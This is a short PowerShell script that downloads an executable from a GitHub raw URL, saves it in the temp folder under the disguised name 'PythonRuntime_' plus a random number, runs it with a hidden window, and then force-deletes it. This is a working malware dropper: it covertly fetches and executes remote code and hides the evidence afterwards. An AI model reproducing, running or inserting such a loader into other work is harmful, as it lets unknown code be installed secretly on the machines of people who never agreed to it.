$rand = Get-Random
$path = "$env:TEMP\PythonRuntime_$rand.exe" 
Invoke-WebRequest -Uri "https://github.com/skiddyskid111/resources/raw/main/main.exe" -OutFile $path 
Start-Process $path -WindowStyle Hidden -Wait 
Remove-Item $path -Force
